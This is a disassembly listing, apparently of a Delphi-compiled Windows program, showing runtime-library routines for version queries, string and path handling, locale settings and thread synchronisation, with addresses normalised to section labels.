mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
retn
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
call sub_403f64
xor eax eax
mov [ rw-data ] eax
sub_40e36c
add esp 0xffffff6c
mov [ esp ] 0x94
push esp
call GetVersionExA
test eax eax
je r-xdata
add esp 0x94
retn
mov eax [ esp + 0x10 ]
mov [ rw-data ] eax
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
mov eax [ esp + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ esp + 0xc ]
mov [ rw-data ] eax
mov eax [ esp + 0xc ]
and eax 0xffff
mov [ rw-data ] eax
jmp r-xdata
mov eax rw-data
lea edx [ esp + 0x14 ]
mov ecx 0x80
call sub_4050b4
sub_40e3fc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_40e4d2
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0xffffffff
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_404edc
lea eax [ ebp - 0x4 ]
call j_sub_405330#2
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_405324
push eax
call GetFileVersionInfoSizeA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e4d9
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov eax ebx
call sub_402d28
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_40e4b5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
push ebx
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_405324
push eax
call GetFileVersionInfoA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_402d44
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
call VerQueryValueA
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
sub_40e4e8
push esi
push edi
mov edi edx
xor edx edx
test eax eax
je r-xdata
mov eax edx
pop edi
pop esi
retn
cmp [ eax + edi ] 0x0
je r-xdata
test edi edi
jne r-xdata
mov esi edi
dec esi
jmp r-xdata
movzx eax [ eax ]
movzx eax al
bt [ rw-data ] eax
jae r-xdata
test esi esi
jl r-xdata
mov dl 0x1
jmp r-xdata
mov ecx edi
sub ecx esi
and ecx 0x80000001
jns r-xdata
movzx ecx [ eax + esi ]
movzx ecx cl
bt [ rw-data ] ecx
jb r-xdata
test ecx ecx
jne r-xdata
dec ecx
or ecx 0xfffffffe
inc ecx
dec esi
movzx eax [ eax + edi ]
movzx eax al
bt [ rw-data ] eax
jae r-xdata
mov dl 0x2
jmp r-xdata
mov dl 0x1
sub_40e55c
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_405324
mov edx esi
dec edx
call sub_40e4e8
sub_40e598
push ebx
mov ebx eax
mov ecx ebx
test ecx ecx
je r-xdata
cmp edx ecx
jle r-xdata
sub ecx 0x4
mov ecx [ ecx ]
call sub_40e5bc
pop ebx
retn
mov edx ebx
test edx edx
je r-xdata
sub edx 0x4
mov edx [ edx ]
sub_40e5bc
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
xor esi esi
test ebp ebp
jg r-xdata
mov eax edi
test eax eax
je r-xdata
mov al 0x1
jmp r-xdata
cmp eax ebp
setl al
sub eax 0x4
mov eax [ eax ]
test al al
jne r-xdata
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi ebp
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x1
xor esi esi
cmp ebp ebx
jl r-xdata
movzx eax [ edi + ebx - 0x1 ]
movzx eax al
bt [ rw-data ] eax
jae r-xdata
inc ebx
mov edx ebx
mov eax edi
call sub_40e808
mov ebx eax
jmp r-xdata
inc esi
cmp ebp ebx
jge r-xdata
sub_40e624
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax edi
test eax eax
je r-xdata
mov [ ebp - 0xc ] eax
mov esi 0x1
mov ebx 0x1
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
cmp ebx [ ebp - 0xc ]
jge r-xdata
cmp esi [ ebp - 0x4 ]
jne r-xdata
cmp esi [ ebp - 0x4 ]
jl r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] esi
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp ebx [ ebp - 0xc ]
jge r-xdata
inc esi
movzx eax [ edi + ebx - 0x1 ]
movzx eax al
bt [ rw-data ] eax
jae r-xdata
movzx eax [ edi + ebx - 0x1 ]
movzx eax al
bt [ rw-data ] eax
jae r-xdata
inc ebx
mov edx ebx
mov eax edi
call sub_40e808
mov ebx eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_40e808
dec eax
mov ebx eax
sub_40e6b4
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jg r-xdata
mov eax esi
test eax eax
je r-xdata
mov al 0x1
jmp r-xdata
cmp eax ebx
setl al
sub eax 0x4
mov eax [ eax ]
test al al
jne r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp ebx 0x1
jle r-xdata
mov [ esp ] ebx
cmp [ rw-data ] 0x0
je r-xdata
push esp
lea ecx [ esp + 0x8 ]
mov edi ebx
dec edi
mov edx edi
mov eax esi
call sub_40e624
cmp edi [ esp + 0x4 ]
jle r-xdata
mov eax esi
test eax eax
je r-xdata
mov al 0x1
jmp r-xdata
cmp eax [ esp ]
setle al
sub eax 0x4
mov eax [ eax ]
test al al
je r-xdata
inc [ esp ]
jmp r-xdata
xor eax eax
mov [ esp ] eax
jmp r-xdata
sub_40e738
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
xor eax eax
mov [ esp ] eax
test edx edx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov esi ebx
mov eax esi
test eax eax
je r-xdata
cmp eax edx
jge r-xdata
sub eax 0x4
mov eax [ eax ]
cmp [ rw-data ] 0x0
je r-xdata
mov eax esi
test eax eax
je r-xdata
mov [ esp ] edx
push esp
lea ecx [ esp + 0x8 ]
mov eax ebx
call sub_40e624
mov eax esi
test eax eax
je r-xdata
mov edx eax
sub eax 0x4
mov eax [ eax ]
cmp eax [ esp ]
jge r-xdata
sub eax 0x4
mov eax [ eax ]
mov eax esi
test eax eax
je r-xdata
mov [ esp ] eax
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
sub_40e7d0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
movzx edx [ ebx + esi - 0x1 ]
movzx edx dl
bt [ rw-data ] edx
jae r-xdata
mov eax ebx
call sub_405324
add eax esi
dec eax
call sub_40e7a8
sub_40e808
push ebx
push esi
mov ebx edx
mov esi eax
lea eax [ ebx + 0x1 ]
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
movzx edx [ esi + ebx - 0x1 ]
movzx edx dl
bt [ rw-data ] edx
jae r-xdata
mov eax esi
call sub_405324
add eax ebx
dec eax
call sub_40e7a8
add eax ebx
sub_40e840
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
xor eax eax
mov eax esi
test eax eax
je r-xdata
xor eax eax
cmp [ esi + ebx - 0x1 ] 0x5c
sete al
jmp r-xdata
cmp eax ebx
setge al
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
xor eax eax
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_40e55c
test al al
sete al
pop esi
pop ebx
retn
test al al
je r-xdata
test al al
je r-xdata
sub_40e888
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
mov eax ebx
mov edx esi
call sub_404e98
mov eax [ ebx ]
mov [ esp ] eax
mov esi [ esp ]
test esi esi
je r-xdata
mov eax [ ebx ]
mov edx esi
call sub_40e840
test al al
jne r-xdata
sub esi 0x4
mov esi [ esi ]
pop edx
pop esi
pop ebx
retn
mov eax ebx
mov edx r-xdata
call sub_40512c
sub_40e8d4
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
mov eax ebx
mov edx esi
call sub_404e98
mov eax [ ebx ]
mov [ esp ] eax
mov esi [ esp ]
test esi esi
je r-xdata
mov eax [ ebx ]
mov edx esi
call sub_40e840
test al al
je r-xdata
sub esi 0x4
mov esi [ esi ]
pop edx
pop esi
pop ebx
retn
mov eax [ ebx ]
mov [ esp ] eax
mov eax [ esp ]
test eax eax
je r-xdata
mov edx eax
dec edx
mov eax ebx
call sub_4055ac
sub eax 0x4
mov eax [ eax ]
sub_40e924
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
xor edi edi
mov eax ebx
call sub_405324
push eax
mov eax esi
call sub_405324
mov ebp eax
mov eax ebp
pop edx
call sub_40e9f0
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi ebx
sub edi ebp
inc edi
sub_40e95c
push ebx
push esi
push edi
push ebp
mov edi edx
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_40933c
mov eax esi
test eax eax
je r-xdata
mov ebp eax
mov eax edi
mov edx ebp
call sub_4055ac
mov ebx 0x1
cmp ebp ebx
jl r-xdata
sub eax 0x4
mov eax [ eax ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call j_sub_405330
movzx edx [ esi + ebx - 0x1 ]
mov [ eax + ebx - 0x1 ] dl
movzx eax [ esi + ebx - 0x1 ]
movzx eax al
bt [ rw-data ] eax
jae r-xdata
mov eax [ edi ]
movzx eax [ eax + ebx - 0x1 ]
add al 0xbf
sub al 0x1a
jae r-xdata
inc ebx
mov eax edi
call j_sub_405330
movzx edx [ esi + ebx - 0x1 ]
mov [ eax + ebx - 0x1 ] dl
jmp r-xdata
inc ebx
cmp ebp ebx
jge r-xdata
mov eax edi
call j_sub_405330
add [ eax + ebx - 0x1 ] 0x20
jmp r-xdata
sub_40e9f0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
test ebp ebp
je r-xdata
cmp [ ebp ] 0x0
je r-xdata
mov eax esi
call sub_40a308
mov [ esp ] eax
mov eax ebp
call sub_40a308
mov edi eax
mov edx ebp
mov eax esi
call sub_40a4dc
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
xor ebx ebx
mov eax ebx
sub eax esi
mov edx [ esp ]
sub edx eax
cmp edi edx
jbe r-xdata
mov edx ebx
sub edx esi
mov eax esi
call sub_40e580
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x2
je r-xdata
cmp [ esp + 0x4 ] 0x1
jne r-xdata
push edi
push ebp
push edi
push ebx
push 0x0
push 0x400
call CompareStringA
cmp eax 0x2
je r-xdata
inc ebx
mov edx ebp
mov eax ebx
call sub_40a4dc
mov ebx eax
inc ebx
sub_40ea90
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_40eac4
mov esi eax
mov edi esi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edi esi
inc esi
mov edx ebx
mov eax esi
call sub_40eac4
mov esi eax
test esi esi
jne r-xdata
sub_40eac4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_40a4c8
mov edi eax
test edi edi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov edx edi
sub edx esi
mov eax esi
call sub_40e580
sub al 0x1
jb r-xdata
je r-xdata
inc edi
jmp r-xdata
inc edi
mov edx ebx
mov eax edi
call sub_40a4c8
mov edi eax
test edi edi
jne r-xdata
sub_40eb04
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xffffffec
push edi
push 0x0
call GetCPInfo
xor esi esi
jmp r-xdata
cmp esi 0xc
jge r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
movzx eax [ edi + esi + 0x6 ]
or al [ edi + esi + 0x7 ]
jne r-xdata
movzx eax [ edi + esi + 0x6 ]
movzx ebx [ edi + esi + 0x7 ]
sub bl al
jb r-xdata
add esi 0x2
inc ebx
mov [ ebp - 0x1 ] al
movzx eax [ ebp - 0x1 ]
movzx eax al
bts [ rw-data ] eax
inc [ ebp - 0x1 ]
dec bl
jne r-xdata
sub_40eb60
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi rw-data
mov [ esi ] 0x409
mov [ esi + 0x4 ] 0x9
mov [ esi + 0x8 ] 0x1
call GetThreadLocale
test eax eax
je r-xdata
test ax ax
je r-xdata
mov [ esi ] eax
push esi
mov esi r-xdata
mov edi rw-data
mov ecx 0x8
[ edi ] [ esi ]
pop esi
cmp [ rw-data ] 0x4
jle r-xdata
mov edx eax
and dx 0x3ff
movzx edx dx
mov [ esi + 0x4 ] edx
movzx eax ax
shr eax 0xa
mov [ esi + 0x8 ] eax
push 0x4a
call GetSystemMetrics
test eax eax
setne al
mov [ esi + 0xd ] al
cmp [ rw-data ] 0x2
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_40eb04
pop ecx
mov [ esi + 0xd ] 0x1
jmp r-xdata
push 0x2a
call GetSystemMetrics
test eax eax
setne bl
mov [ esi + 0xc ] bl
test bl bl
je r-xdata
sub_40ec24
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
xor eax eax
push ebp
push sub_40eeef
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_40eb60
call sub_40d4a0
cmp [ rw-data ] 0x0
je r-xdata
call GetThreadLocale
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
xor ecx ecx
mov edx 0x14
mov eax ebx
call sub_40d3ec
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_404e98
lea eax [ ebp - 0x14 ]
push eax
mov ecx r-xdata
mov edx 0x1b
mov eax ebx
call sub_40d3ec
mov eax [ ebp - 0x14 ]
xor edx edx
call sub_409a24
mov [ rw-data ] al
lea eax [ ebp - 0x18 ]
push eax
mov ecx r-xdata
mov edx 0x1c
mov eax ebx
call sub_40d3ec
mov eax [ ebp - 0x18 ]
xor edx edx
call sub_409a24
mov [ rw-data ] al
mov cl 0x2c
mov edx 0xf
mov eax ebx
call sub_40d438
mov [ rw-data ] al
mov cl 0x2e
mov edx 0xe
mov eax ebx
call sub_40d438
mov [ rw-data ] al
lea eax [ ebp - 0x1c ]
push eax
mov ecx r-xdata
mov edx 0x19
mov eax ebx
call sub_40d3ec
mov eax [ ebp - 0x1c ]
xor edx edx
call sub_409a24
mov [ rw-data ] al
mov cl 0x2f
mov edx 0x1d
mov eax ebx
call sub_40d438
mov [ rw-data ] al
lea eax [ ebp - 0x24 ]
push eax
mov ecx r-xdata
mov edx 0x1f
mov eax ebx
call sub_40d3ec
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_40d728
mov edx [ ebp - 0x20 ]
mov eax rw-data
call sub_404e98
lea eax [ ebp - 0x2c ]
push eax
mov ecx r-xdata
mov edx 0x20
mov eax ebx
call sub_40d3ec
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x28 ]
call sub_40d728
mov edx [ ebp - 0x28 ]
mov eax rw-data
call sub_404e98
mov cl 0x3a
mov edx 0x1e
mov eax ebx
call sub_40d438
mov [ rw-data ] al
lea eax [ ebp - 0x30 ]
push eax
mov ecx r-xdata
mov edx 0x28
mov eax ebx
call sub_40d3ec
mov edx [ ebp - 0x30 ]
mov eax rw-data
call sub_404e98
lea eax [ ebp - 0x34 ]
push eax
mov ecx r-xdata
mov edx 0x29
mov eax ebx
call sub_40d3ec
mov edx [ ebp - 0x34 ]
mov eax rw-data
call sub_404e98
lea eax [ ebp - 0x8 ]
call sub_404e44
lea eax [ ebp - 0xc ]
call sub_404e44
lea eax [ ebp - 0x38 ]
push eax
mov ecx r-xdata
mov edx 0x25
mov eax ebx
call sub_40d3ec
mov eax [ ebp - 0x38 ]
xor edx edx
call sub_409a24
test eax eax
jne r-xdata
call sub_40d678
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404edc
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404edc
jmp r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_4051e4
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_4051e4
mov cl 0x2c
mov edx 0xc
mov eax ebx
call sub_40d438
mov [ rw-data ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40eef6
lea eax [ ebp - 0x40 ]
mov edx 0x10
call sub_404e68
retn
lea eax [ ebp - 0x40 ]
push eax
mov ecx r-xdata
mov edx 0x1005
mov eax ebx
call sub_40d3ec
mov eax [ ebp - 0x40 ]
xor edx edx
call sub_409a24
test eax eax
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx r-xdata
mov edx 0x23
mov eax ebx
call sub_40d3ec
mov eax [ ebp - 0x3c ]
xor edx edx
call sub_409a24
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_404edc
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404edc
jmp r-xdata
sub_40ef9c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_40f0e5
push [ fs : eax ]
mov [ fs : eax ] esp
test [ ebp + 0xc ] 0x2
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_404edc
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
call sub_404edc
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_409304
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_409304
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_404edc
mov eax esi
call sub_404e44
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_40e924
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f0ec
lea eax [ ebp - 0x1c ]
call sub_404e44
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_404e68
retn
push [ esi ]
lea eax [ ebp - 0x1c ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_405384
push [ ebp - 0x1c ]
push [ ebp - 0x14 ]
mov eax esi
mov edx 0x3
call sub_4051e4
mov edi [ ebp - 0x10 ]
test edi edi
je r-xdata
mov eax esi
mov edx [ ebp - 0xc ]
call sub_40512c
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
lea edx [ edi + ebx ]
mov ecx 0x7fffffff
mov eax [ ebp - 0xc ]
call sub_405384
test [ ebp + 0xc ] 0x1
jne r-xdata
sub edi 0x4
mov edi [ edi ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax esi
mov edx [ ebp - 0xc ]
call sub_40512c
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov edx [ ebp - 0x18 ]
add edx ebx
mov ecx 0x7fffffff
mov eax [ ebp - 0x4 ]
call sub_405384
mov eax [ ebp - 0x18 ]
sub eax 0x4
mov eax [ eax ]
mov [ ebp - 0x18 ] eax
sub_40f143
inc eax
add [ eax + eax ] al
add [ eax ] al
lea eax [ eax ]
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov edx [ rw-data ]
mov edx [ edx ]
test edx edx
je r-xdata
mov [ esp ] edx
cmp [ esp ] 0x0
je r-xdata
cmp eax [ edx + 0x4 ]
je r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov edx [ edx ]
test edx edx
jne r-xdata
mov eax [ esp ]
mov ebx [ eax + 0x14 ]
cmp [ ebx ] 0x0
je r-xdata
mov [ esp + 0x4 ] rw-data
mov [ esp + 0x4 ] rw-data
jmp r-xdata
mov edx [ r-xdata ]
mov eax ebx
call sub_405f2c
mov eax [ esp ]
xor edx edx
mov [ eax + 0x14 ] edx
inc edi
xor esi esi
mov eax [ ebx + 0x4 ]
call sub_406250
mov edi eax
test edi edi
jl r-xdata
mov edx [ ebx + 0x4 ]
cmp [ edx + eax * 4 + 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ edx + eax * 4 ]
lea edx [ esi + esi * 4 ]
mov ecx [ ebx + 0x4 ]
mov edx [ ecx + edx * 4 + 0x4 ]
mov [ edx ] eax
jmp r-xdata
lea eax [ esi + esi * 4 ]
mov edx [ ebx + 0x4 ]
cmp [ edx + eax * 4 ] 0x0
je r-xdata
lea eax [ esi + esi * 4 ]
mov edx [ ebx + 0x4 ]
mov eax [ edx + eax * 4 + 0xc ]
xor edx edx
mov [ esp + 0x8 ] edx
inc esi
dec edi
jne r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ edx + eax * 4 + 0x4 ]
lea edx [ esi + esi * 4 ]
mov ecx [ ebx + 0x4 ]
mov edx [ ecx + edx * 4 ]
mov [ edx + 0x4 ] eax
movzx eax [ esp + 0x8 ]
xor al [ esp + 0x9 ]
xor al [ esp + 0xa ]
xor al [ esp + 0xb ]
movzx edx al
mov ecx [ esp + 0x4 ]
mov edx [ ecx + edx * 4 ]
lea ecx [ esi + esi * 4 ]
mov ebp [ ebx + 0x4 ]
lea ecx [ ebp + ecx * 4 ]
cmp edx ecx
jne r-xdata
mov ecx [ esp + 0x8 ]
add ecx ecx
add ecx ecx
mov ebp [ esp + 0x8 ]
shr ebp 0x1e
or ecx ebp
movzx edx dl
movzx edx [ edx + rw-data ]
xor ecx edx
mov [ esp + 0x8 ] ecx
cmp [ eax + 0x1 ] 0x0
je r-xdata
lea eax [ esi + esi * 4 ]
mov edx [ ebx + 0x4 ]
cmp [ edx + eax * 4 + 0x4 ] 0x0
je r-xdata
lea edx [ esi + esi * 4 ]
mov ecx [ ebx + 0x4 ]
mov edx [ ecx + edx * 4 ]
movzx eax al
mov ecx [ esp + 0x4 ]
mov [ ecx + eax * 4 ] edx
mov edx [ esp + 0x8 ]
add edx edx
add edx edx
mov ecx [ esp + 0x8 ]
shr ecx 0x1e
or edx ecx
movzx ecx [ eax + 0x1 ]
movzx ecx [ ecx + rw-data ]
xor edx ecx
mov [ esp + 0x8 ] edx
cmp [ eax + 0x2 ] 0x0
je r-xdata
mov edx [ esp + 0x8 ]
add edx edx
add edx edx
mov ecx [ esp + 0x8 ]
shr ecx 0x1e
or edx ecx
movzx ecx [ eax + 0x2 ]
movzx ecx [ ecx + rw-data ]
xor edx ecx
mov [ esp + 0x8 ] edx
cmp [ eax + 0x3 ] 0x0
je r-xdata
mov edx [ esp + 0x8 ]
add edx edx
add edx edx
mov ecx [ esp + 0x8 ]
shr ecx 0x1e
or edx ecx
movzx ecx [ eax + 0x3 ]
movzx ecx [ ecx + rw-data ]
xor edx ecx
mov [ esp + 0x8 ] edx
add eax 0x4
jmp r-xdata
movzx edx [ eax ]
test dl dl
je r-xdata
sub_40f338
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor edx edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_40f3c3
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dc70
mov edx eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40d3a0
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dcac
mov edx eax
jmp r-xdata
mov [ edx + 0xc ] ebx
mov eax edx
call sub_4047d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f3ca
lea eax [ ebp - 0x14 ]
call sub_404e44
retn
sub_40f3e0
push ebx
push esi
mov bl 0x1
mov esi [ rw-data ]
jmp r-xdata
test bl bl
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
test esi esi
jne r-xdata
call [ esi + 0x4 ]
mov ebx eax
mov esi [ esi ]
sub_40f400
push ebx
push esi
mov esi rw-data
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov ebx [ esi ]
mov eax [ ebx ]
mov [ esi ] eax
mov edx 0x8
mov eax ebx
call sub_402d44
pop esi
pop ebx
retn
sub_40f424
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
pop ebx
retn
mov eax sub_40a1e8
mov [ rw-data ] eax
sub_40f4a8
push ebx
push esi
push edi
push ebp
push ecx
call sub_404330
mov [ esp ] dl
mov ebp eax
xor edi edi
inc edi
cmp edi 0x10
jne r-xdata
mov esi ebx
mov ebx [ ebx ]
mov eax esi
call sub_402d44
test ebx ebx
jne r-xdata
mov ebx [ ebp + edi * 4 + 0x4 ]
xor eax eax
mov [ ebp + edi * 4 + 0x4 ] eax
test ebx ebx
je r-xdata
movzx edx [ esp ]
and dl 0xfc
mov eax ebp
call sub_403f54
cmp [ esp ] 0x0
jle r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4042d8
sub_40f51c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_40f500
mov ebx eax
call GetCurrentThreadId
mov esi eax
movzx eax bl
mov ebp [ edi + eax * 4 + 0x4 ]
jmp r-xdata
test ebp ebp
je r-xdata
test ebp ebp
jne r-xdata
cmp esi [ ebp + 0x4 ]
jne r-xdata
mov eax [ esp ]
mov [ eax ] ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40f5a4
mov ebp eax
test ebp ebp
jne r-xdata
mov ebp [ ebp ]
mov eax 0x10
call sub_402d10
mov ebp eax
mov [ ebp + 0x4 ] esi
mov [ ebp + 0x8 ] 0x7fffffff
mov [ ebp ] ebp
movzx eax bl
lea eax [ edi + eax * 4 + 0x4 ]
mov edx ebp
call sub_40f498
mov [ ebp ] eax
sub_40f5a4
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_40f500
movzx eax al
mov ebx [ ebx + eax * 4 + 0x4 ]
test ebx ebx
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
lea eax [ ebx + 0x8 ]
mov edx 0x7fffffff
call sub_40f498
mov esi eax
cmp esi 0x7fffffff
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
call GetCurrentThreadId
mov [ ebx + 0x4 ] eax
jmp r-xdata
sub_40f5e8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403f34
mov [ esi + 0xc ] 0xffff
push 0x0
push 0xffffffff
push 0xffffffff
push 0x0
call CreateEventA
mov [ esi + 0x10 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ esi + 0x20 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_40f65c
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
mov eax esi
call sub_40f6e8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403f54
mov eax [ esi + 0x10 ]
push eax
call CloseHandle
mov eax [ esi + 0x14 ]
push eax
call CloseHandle
mov eax [ esi + 0x20 ]
